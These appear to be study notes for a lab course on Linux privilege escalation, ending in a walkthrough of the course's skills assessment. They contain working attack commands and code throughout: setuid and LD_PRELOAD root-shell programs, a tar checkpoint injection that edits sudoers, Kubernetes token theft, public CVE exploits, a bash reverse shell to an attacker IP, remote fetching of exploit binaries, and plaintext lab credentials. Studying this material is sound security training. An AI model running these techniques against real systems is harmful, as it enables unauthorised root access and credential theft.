# Linux Privilege Escalation

1. [Information Gathering](#information-gathering)
1. [Environment-based Privilege Escalation](#environment-based-privilege-escalation)
1. [Permissions-based Privilege Escalation](#permissions-based-privilege-escalation)
1. [Service-based Privilege Escalation](#service-based-privilege-escalation)
1. [Linux Internals-based Privilege Escalation](#linux-internals-based-privilege-escalation)
1. [Recent 0-Days](#recent-0-days)
1. [Skills Assessment](#skills-assessment)

## Information Gathering

* Environment enumeration:

    ```sh
    whoami

    id

    hostname

    ifconfig

    sudo -l
    # what commands can be run as sudo without password

    cat /etc/os-release
    # find OS, version

    echo $PATH
    # check PATH var for any misconfig

    env
    # check all env vars

    uname -a
    # kernel version

    lscpu
    # cpu type, version

    cat /etc/shells
    # check login shells

    # check if certain defenses are being used
    # like exec shield, iptables, AppArmor, SELinux, fail2ban, snort, ufw

    lsblk
    # drives, block devices

    lpstat
    # if printers attached to system

    cat /etc/fstab
    # check for creds for mounted drives

    route
    # check routing table
    # can also use 'netstat -rn'

    cat /etc/resolv.conf
    # DNS servers

    arp -a
    # to find other hosts communicating with target

    cat /etc/passwd
    # existing users
    # if we can see any hashes in this file, we can try cracking it offline

    grep "*sh$" /etc/passwd
    # check which users have login shells

    cat /etc/group
    # existing groups

    getent group sudo
    # list members of any group

    ls -la /home
    # check which users have personal folders

    df -h
    # mounted file systems

    cat /etc/fstab | grep -v "#" | column -t
    # unmounted file systems

    find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null
    # all hidden files

    find / -type d -name ".*" -ls 2>/dev/null
    # all hidden directories

    ls -l /tmp /var/tmp /dev/shm
    # temporary files
    ```

* Linux services & internals enumeration:

    ```sh
    ip a
    # network interfaces

    cat /etc/hosts

    lastlog
    # check last login times

    w
    # who - check logged in users
    # can also check with 'finger' command

    history
    # check bash history for user

    find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
    # find special history files created by scripts

    ls -la /etc/cron.daily
    # check cronjobs

    find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
    # check process info

    apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
    # list installed packages

    sudo -V
    # check sudo version

    ls -l /bin /usr/bin/ /usr/sbin/
    # review compiled binaries - they may or may not be installed on system

    for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
    # compare existing binaries from earlier with binaries list from GTFObins

    strace ping -c1 10.129.112.20
    # trace and analyze system calls
    # to understand flow of program

    find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
    # review config files

    find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
    # review scripts

    ps aux | grep root
    # running services, processes - filter by user
    ```

* Cred hunting:

    ```sh
    # check for config files, shell scripts, history, backup files, DB files, etc. for creds

    # we can check web root, usually in /var/www, for any such files

    cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
    # search for creds in file

    find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
    # check for config files

    ls ~/.ssh
    # check for SSH keys in home folder
    # check the 'known_hosts' file to find targets
    ```

## Environment-based Privilege Escalation

* PATH abuse:

    ```sh
    echo $PATH
    # creating a script in a directory specified in PATH makes it executable from any directory

    # adding '.' to PATH adds current working directory to the list
    # we can run malicious binaries in that directory

    PATH=.:${PATH}
    
    export PATH

    echo $PATH

    # we can modify behavior of existing commands in that directory
    touch ls

    echo 'echo "PATH ABUSE!!"' > ls

    chmod +x ls

    ls
    # prints the statement instead
    ```

* Wildcard abuse:

    * wildcards can be used as replacement for other chars; shell interprets it before other actions. For e.g. - ```*```, ```?```, ```[ ]```, ```~```, ```-```

    * tar wildcard abuse:

        ```sh
        # suppose we have a cronjob or a script using a tar command with wildcard
        # we can use the --checkpoint option to exploit it
        
        echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
        echo "" > "--checkpoint-action=exec=sh root.sh"
        echo "" > --checkpoint=1
        # when the job runs, the root.sh script is executed
        ```

* [Escaping restricted shells](https://0xffsec.com/handbook/shells/restricted-shells/):

    * restricted shells limit the user in executing commands - only specific commands or specific directories are allowed for safety; examples include ```rbash```, ```rksh```, and ```rzsh```

    * [command injection](https://systemweakness.com/how-to-breakout-of-rbash-restricted-bash-4e07f0fd95e) - suppose shell only allows executing ```ls``` commands with specific args; we can try injecting commands enclosed in backticks -

        ```sh
        ls -l `pwd`

        # similarly, if only 'echo' is allowed, we can get directory contents

        echo /*
        # prints directory listing for '/' path

        # to print file using echo
        echo "$(<a.txt )"
        ```
    
    * command substitution - if shell allows users to execute commands by enclosing them in backticks, we can try escaping the shell by executing command in backtick substitution

    * command chaining - we can multiple commands in a single line, separated by shell metacharacters like ```;``` or ```|```

    * environment variables - if shell uses an environment variable to specify the directory in which commands are executed, we can try to modify the value of the environment variable itself; ```export -p``` to check env vars

    * shell functions - we can define and call shell functions to execute commands not restricted by shell

## Permissions-based Privilege Escalation

* Special permissions:

    * ```setuid``` (set user ID upon execution) - this permission can allow user to execute program with permissions of another user (privesc); appears as a 's' bit -

        ```sh
        find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
        # to find files with suid bit set
        ```
    
    * ```setgid``` (set group ID) - special permission that allows to run binaries with permissions of the group that created them -

        ```sh
        find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
        ```
    
    * we can use resources like [GTFObins](https://gtfobins.github.io/) to find common programs and their exploits

* Sudo rights abuse:

    ```sh
    sudo -l
    # check if current user has any sudo privileges
    # if any NOPASSWD entries are there, we do not need user password

    # if absolute path to binary is not listed, we can do PATH abuse
    ```

* Privileged groups:

    ```sh
    id
    # check if part of any privileged groups

    # abuse lxc membership
    unzip alpine.zip

    lxd init
    # go with defaults
    
    lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
    
    lxc init alpine r00t -c security.privileged=true
    # this makes root user in container same as root user on host
    
    lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
    # mount the host file system
    
    lxc start r00t
    
    lxc exec r00t /bin/sh
    # shell inside container instance
    
    # to access root directory
    cd /mnt/root/root

    # we can similarly abuse other common privileged groups
    # like Docker, disk, ADM
    ```

* Capabilities:

    * allows specific privileges to be granted to processes

        ```sh
        sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
        # setcap used to set capabilities for executables
        # for example, cat_net_bind_service allows to bind to network ports

        # +ep grants effective and permitted privileges for specified capability to executable
        ```
    
    * enumerating:

        ```sh
        find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
        # find capabilities set for binaries
        ```
    
    * exploiting:

        ```sh
        getcap /usr/bin/vim.basic
        # suppose this has cap_dac_override set

        cat /etc/passwd | head -n1
        # root:x:0:0:root:/root:/bin/bash

        /usr/bin/vim.basic /etc/passwd
        # we can modify a system file using this capability

        # we can also make the changes in non-interactive mode
        echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd

        cat /etc/passwd | head -n1
        # root::0:0:root:/root:/bin/bash
        # the 'x' is removed, so we can just 'su' to switch to root without password
        ```

## Service-based Privilege Escalation

* Vulnerable services:

    ```sh
    # check for services and their versions

    screen -v
    # for example, screen 4.5.0 has a privesc vuln

    ./screen_exploit.sh
    # https://www.exploit-db.com/exploits/41154
    # gives root shell
    ```

* Cron job abuse:

    ```sh
    crontab
    # creates cron file, run by cron daemon on specified schedule
    # cronjob can be found in /var/spool/cron

    # certain apps create cron files in /etc/cron.d

    # check writable files and directories for scripts or cron jobs
    find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

    # we have a backups directory with files created every few minutes
    ls -la /dmz-backups/
    # the backup script is world writable and runs as root

    # we can also use tools like pspy to check for background processes
    ./pspy64 -pf -i 1000
    # prints commands and file system events, scans procfs every 1000ms

    # we can modify the backup script by adding a reverse shell one-liner
    # setup a listener on attacker machine so that when the script is run by the cronjob, we get a shell
    ```

* LXD:

    * Linux containers (LXC) - OS-level virtualization; allows multiple Linux systems to run in isolation from each other on a single host

    * Linux daemon (LXD) - designed to contain a complete OS; not an application container but a system container

    ```sh
    id
    # check if we are part of lxc or lxd group

    # we can create our own container and transfer to target
    # or use an existing container

    cd ContainerImages

    ls
    # suppose we already have an Ubuntu template here

    lxc image import ubuntu-template.tar.xz --alias ubuntutemp

    lxc image list
    # verify image has been imported

    # initiate image and configure to avoid isolation features

    lxc init ubuntutemp privesc -c security.privileged=true

    lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

    lxc start privesc
    # start the container

    lxc exec privesc /bin/sh
    # log into container

    ls -l /mnt/root
    # root dir of host system
    ```

* Docker:

    * Docker daemon - responsible for container management & orchestration

    * Docker clients - for enduser to interact with Docker; this communicates with Docker daemon

    * Docker image - template for containers; this can be creating using Dockerfile - text file which defines how to build the image

    * Docker container - lightweight, isolated instance of Docker image

    * Docker shared directories:

        ```sh
        # enumerate docker container to find non-standard directories
        cd /hostsystem/home/cry0l1t3

        ls -l
        # we can check for sensitive files like SSH keys
        ```
    
    * Docker sockets:

        ```sh
        # docker socket is used for communication with Docker daemon

        ls -la
        # check for any docker.sock files

        # we can use docker executable to interact with socket
        # and enumerate containers

        cd /tmp

        wget https://master.dockerproject.org/linux/x86_64/docker -O docker
        # or fetch from attacker to target

        chmod +x docker

        /tmp/docker -H unix:///app/docker.sock ps
        
        # map host root directory to /hostsystem on container
        # using main_app Docker image

        /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app

        /tmp/docker -H unix:///app/docker.sock ps
        # note the container ID

        # log into the new privileged Docker container
        /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash

        # in host container, browse root directory for any SSH keys
        ls -la /hostsystem/root
        ```
    
    * Docker group:

        ```sh
        id
        # check if part of docker group
        # or check if docker has suid bit set or if we are in sudoers file

        docker image ls
        # check images
        ```
    
    * Docker socket:

        ```sh
        ls -la /var/run/docker.sock
        # check if the Docker socket is writable

        docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
        # we get root shell
        ```

* Kubernetes:

    * k8s - container orchestration system which functions by running apps in containers isolated from host system; has a master node (control plane) and worker nodes

    * Pods can hold closely connected containers; each pod functions as a separate VM on a node

    * k8s API:

        ```sh
        curl https://10.129.10.11:6443 -k
        # API server interaction
        # system:anonymous - unauthenticated user

        curl https://10.129.10.11:10250/pods -k | jq .
        # extracting pods from kubelet API
        # this gives all container details

        kubeletctl -i --server 10.129.10.11 pods
        # check pods

        kubeletctl -i --server 10.129.10.11 scan rce
        # for managing pods

        kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
        # executing commands in container
        ```
    
    * k8s privesc:

        ```sh
        kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
        # extract k8s service account token

        kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
        # extract service account certificate

        export token=`cat k8.token`

        kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
        # check access rights in k8s cluster

        # if we can create pods, we can create a YAML file to create a new container
        # and mount entire root filesystem from host into this container

        # after creating YAML file, create new pod
        kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml

        kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
        # list pods and find newly created pod

        # extract root SSH key
        kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
        ```

        ```yaml
        apiVersion: v1
        kind: Pod
        metadata:
        name: privesc
        namespace: default
        spec:
        containers:
        - name: privesc
            image: nginx:1.14.2
            volumeMounts:
            - mountPath: /root
            name: mount-root-into-mnt
        volumes:
        - name: mount-root-into-mnt
            hostPath:
            path: /
        automountServiceAccountToken: true
        hostNetwork: true
        ```

* Logrotate:

    ```sh
    # tool for archiving or disposing old logs
    # rotation function renames or empties old log files
    logrotate --help

    cat /etc/logrotate.conf
    # config file

    sudo cat /var/lib/logrotate.status
    # config forced new rotation on same day

    ls /etc/logrotate.d/
    # config files dir

    # to exploit logrotate, we need write permissions on log files
    # logrotate must run as privileged user or root
    # 'logrotten' exploit for certain versions

    git clone https://github.com/whotwagner/logrotten.git
    
    cd logrotten

    gcc logrotten.c -o logrotten

    # setup listener on attacker machine

    echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
    # reverse shell payload

    grep "create\|compress" /etc/logrotate.conf | grep -v "#"
    # check option - use corresponding exploit function

    # logrotten exploit
    ./logrotten -p ./payload /home/htb-student/backups/access.log
    
    # we need to trigger the logrotate function sometimes
    # we can append a test string to the log file for this

    # if we lose root shell quickly, we can assign SUID bit to root while the shell exists
    # using 'chmod 4777 /bin/bash'
    # then we can use '/bin/bash -p' for privesc in victim session
    ```

* Miscellaneous techniques:

    * Passive traffic capture - we can use ```tcpdump``` to capture network traffic; in case creds are captured, we can use tools like [net-creds](https://github.com/DanMcInerney/net-creds) and [PCredz](https://github.com/lgandx/PCredz) to examine data

    * Weak NFS privileges:

        ```sh
        showmount -e 10.129.2.12
        # check for any accessible mounts - we have /tmp in this example

        # if no_root_squash option is set in NFS config
        # we can create a SETUID binary that executes shell using local root
        # mount the directory, copy the binary and set SUID bit

        # on attacker machine, switch to root
        sudo su

        vim shell.c

        gcc shell.c -o shell
        # can use '-static' flag in case we are getting error due to different glibc versions

        # on attacker machine, mount the /tmp directory
        sudo mount -t nfs 10.129.2.12:/tmp /mnt

        cp shell /mnt

        chmod u+s /mnt/shell
        # the shellcode is copied from attacker as root, to victim and SUID bit is set

        # on target machine
        ./shell
        # gives root shell
        ```

        ```c
        #include <stdio.h>
        #include <sys/types.h>
        #include <unistd.h>
        #include <stdlib.h>

        int main(void)
        {
        setuid(0); setgid(0); system("/bin/bash");
        }
        ```
    
    * Hijacking Tmux sessions:

        ```sh
        # a tmux process running as privileged user can be hijacked if not config properly

        tmux -S /shareds new -s debugsess

        chown root:devs /shareds

        # start by checking for any tmux process

        ps aux | grep tmux
        # this shows the tmux command

        ls -la /shareds
        # check permissions

        id
        # review group membership
        # we are part of 'devs'

        tmux -S /shareds
        # attach to tmux session
        # we have root priv
        ```

## Linux Internals-based Privilege Escalation

* Kernel exploits:

    ```sh
    uname -a
    # check kernel level, OS version

    cat /etc/lsb-release
    # check for any exploits associated with this

    # for example, linux 4.4.0-116-generic kernel on Ubuntu 16.04
    # is vulnerable to a local privesc exploit

    # download the exploit code and prepare it
    gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit

    ./kernel_exploit
    # gives root shell
    ```

* Shared libraries:

    * 2 types of libraries in Linux - static libraries (.a file) and dynamically linked shared object libraries (.so file)

    * There are multiple methods for specifying the location of dynamic libraries - ```-rpath``` or ```-rpath-link``` flags when compiling a program, using env variables ```LD_RUN_PATH``` or ```LD_LIBRARY_PATH```, placing libraries in ```/lib``` or ```/usr/lib```, or specifying another directory containing libraries within ```/etc/ld.so.conf``` config file

    * Also, ```LD_PRELOAD``` env var can load a library before executing a binary, and its functions are given more preference

    ```sh
    # view shared objects required by a binary using ldd
    ldd /bin/ls

    # we can use the LD_PRELOAD var for privesc
    # for this we need user with sudo priv

    sudo -l
    # user has rights to restart Apache service as root, but it is not in GTFObins
    # env_keep+=LD_PRELOAD is set however
    # we can use that to run a custom shared library file

    vim root.c
    # exploit code

    gcc -fPIC -shared -o root.so root.c -nostartfiles

    # privesc to root
    sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
    ```

    ```c
    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>
    #include <unistd.h>

    void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
    }
    ```

* Shared object hijacking:

    ```sh
    ls -la payroll
    # custom binary with SETUID bit

    ldd payroll
    # shows shared objects reqd
    # we can see a non-standard library 'libshared.so' as a dependency

    readelf -d payroll | grep PATH
    # this shows the RUNPATH config - libraries in this folder are given more preference
    # here, the '/development' folder is used

    ls -la /development
    # writable by all users

    # we can place a malicious library in this folder
    # but before compiling a library, we need to find the function name called by binary

    ldd payroll
    # non-standard shared library - /development/libshared.so

    cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
    # copying a standard, existing library

    ./payroll
    # executing the binary throws an error stating it failed to find the function 'dbquery'

    vim src.c
    # malicious code for 'dbquery' function
    
    gcc src.c -fPIC -shared -o /development/libshared.so
    # compile shared object

    ./payroll
    # executing the binary now gives us root shell
    ```

    ```c
    #include<stdio.h>
    #include<stdlib.h>
    #include<unistd.h>

    void dbquery() {
        printf("Malicious library loaded\n");
        setuid(0);
        system("/bin/sh -p");
    } 
    ```

* Python library hijacking:

    * Wrong write permissions:

        ```sh
        ls -l mem_status.py
        # Python script has SUID bit set

        less mem_status.py
        # the script uses the 'psutil' module and its function 'virtual_memory()'
        
        # check in which file this function is defined
        # 'pip3 show psutil' gives us location of psutil module
        # so we can search for the exact function in this location
        grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
        
        # lists out some python files, check if they have write permissions
        ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

        # we have write permissions for this file
        vim /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

        # at the beginning of the 'virtual_memory' function, we can hijack
        # and place our code - start with test code

        # if we run the script with sudo, we should get the desired result
        sudo /usr/bin/python3 ./mem_status.py
        # if it works, we can edit the code with reverse-shell one-liner
        ```

        ```py
        def virtual_memory():
            # test code
            import os
            os.system('id')
        ```

    * Library path:

        ```sh
        # PYTHONPATH listing
        python3 -c 'import sys; print("\n".join(sys.path))'
        # each version has a specific order in which libraries are searched & imported

        # we can exploit this if we have write permissions to one of the paths having a higher priority
        # than the module that is imported by the script

        # suppose the script uses 'psutil' module

        pip3 show psutil
        # shows default installation location

        # check for any misconfigured directory permissions from PYTHONPATH variable
        ls -la /usr/lib/python3.8
        # this is writable
        # and it is higher in priority than the installation location of 'psutil'

        cd /usr/lib/python3.8

        vim psutil.py
        # we can create a malicious module with our own 'virtual_memory()' function
        # it should have the same name as the module and the same function

        sudo /usr/bin/python3 mem_status.py
        # this runs the malicious code
        ```

    * PYTHONPATH env var:

        ```sh
        # PYTHONPATH env var shows which directories Python can search for modules to import

        sudo -l
        # (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
        # SETENV shows we can set the env var with the python3 binary

        cd /tmp

        vim psutil.py
        # create a malicious module in any folder with same name and same function as benign script

        # execute the hijacked script
        sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
        # the binary imports the malicious module from /tmp
        ```

## Recent 0-Days

* Sudo:

    ```sh
    # from sudoers file, check which users/groups are allowed to run specific programs
    sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'

    sudo -V | head -n1
    # check sudo version

    # a recent sudo vulnerability is CVE-2021-3156

    git clone https://github.com/blasty/CVE-2021-3156.git
    cd CVE-2021-3156
    make

    ./sudo-hax-me-a-sandwich
    # shows available target options

    # for Ubuntu 20.04.1, sudo 1.8.31
    ./sudo-hax-me-a-sandwich 1
    # we get root shell

    # there is an older sudo vulnerability CVE-2019-14287
    # for all versions below 1.8.28

    # it needs sudoers file to allow an user to execute a specific command
    # '(ALL) /usr/bin/id'
    sudo -l

    # exploit
    sudo -u#-1 id
    ```

* Polkit:

    ```sh
    # polkit has a 'pkexec' utility, which can run a program with rights of another user
    pkexec -u root id
    # executes 'id' command as root

    # Pwnkit, CVE-2021-4034, is a recent vulnerability for pkexec

    git clone https://github.com/arthepsy/CVE-2021-4034.git
    cd CVE-2021-4034
    gcc cve-2021-4034-poc.c -o poc

    ./poc
    # exploit gives root shell
    ```

* Dirty pipe:

    ```sh
    # all kernels from 5.8 to 5.17 are affected by a vulnerability in Linux kernel
    # CVE-2022-0847, Dirty Pipe

    uname -r
    # verify kernel version

    find / -perm -4000 2>/dev/null
    # find SUID binaries

    git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
    cd CVE-2022-0847-DirtyPipe-Exploits
    bash compile.sh

    # there are 2 exploits included
    ./exploit-1
    # exploit-1 modifies /etc/passwd to give root shell

    # exploit-2 executes SUID binaries with root priv
    ./exploit-2 /usr/bin/sudo
    ```

## Skills Assessment

    ```sh
    # we have been given SSH access
    # need to find 5 flags at different privilege levels

    ls -la /home
    # besides htb-student, we have 2 users - barry and mrb3n

    ls -la
    # enumerate folders in current home directory

    ls -la .config
    # flag1
    cat .config/.flag1.txt

    ls -la /home/barry
    # contains flag2, but we do not have read permissions

    ls -la /home/barry/.ssh
    # permission denied

    cat /home/barry/.bash_history
    # includes credentials "i_l0ve_s3cur1ty!"

    # check for creds reuse
    su barry
    # this works

    cd

    cat flag2.txt

    id
    # part of 'adm' group
    # we can check files in /var/log

    ls -la /var/log
    # flag3

    cat /var/log/flag3.txt

    find / -type f -name flag4.txt 2>/dev/null
    # we have flag4 in /var/lib/tomcat9
    # but cannot read this file

    ss -ltnp
    # check services and ports
    # we have a service on port 8080

    curl localhost:8080
    # we have tomcat running on this port
    
    # tomcat enumeration
    curl localhost:8080/docs
    # this is running Apache Tomcat/9.0.31

    # from tomcat hacktricks enumeration
    # check for tomcat creds file 'tomcat-users.xml'
    find / -type f -name *tomcat-users* 2>/dev/null

    cat /etc/tomcat9/tomcat-users.xml
    # permission denied

    # we have a .bak file as well
    cat /etc/tomcat9/tomcat-users.xml.bak
    # this includes the creds 'tomcatadm:T0mc@t_s3cret_p@ss!'

    # we can access the web app manager at /manager using these creds

    # exploit using metasploit
    # on attacker machine
    msfconsole -q
    use exploit/multi/http/tomcat_mgr_upload
    options
    set HttpPassword T0mc@t_s3cret_p@ss!
    set HttpUsername tomcatadm
    set RHOSTS 10.129.153.118
    set RPORT 8080
    set LHOST 10.10.16.44

    run
    # we get meterpreter shell
    # drop into shell
    shell

    id
    # we are 'tomcat' user

    # flag4
    cat /var/lib/tomcat9/flag4.txt

    # in barry SSH session
    sudo -V
    # 1.8.31

    cat /etc/lsb-release
    # Ubuntu 20.04.1
    # we can check for CVE-2021-3156 sudo exploit

    # fetch the statically compiled binaries from attacker machine
    wget --recursive --no-parent http://10.10.15.1:8000/CVE-2021-3156

    chmod +x sudo-hax-me-a-sandwich

    ./sudo-hax-me-a-sandwich 1
    # this works and we get root shell

    ls -la /root
    # flag5

    cat /root/flag5.txt
    ```
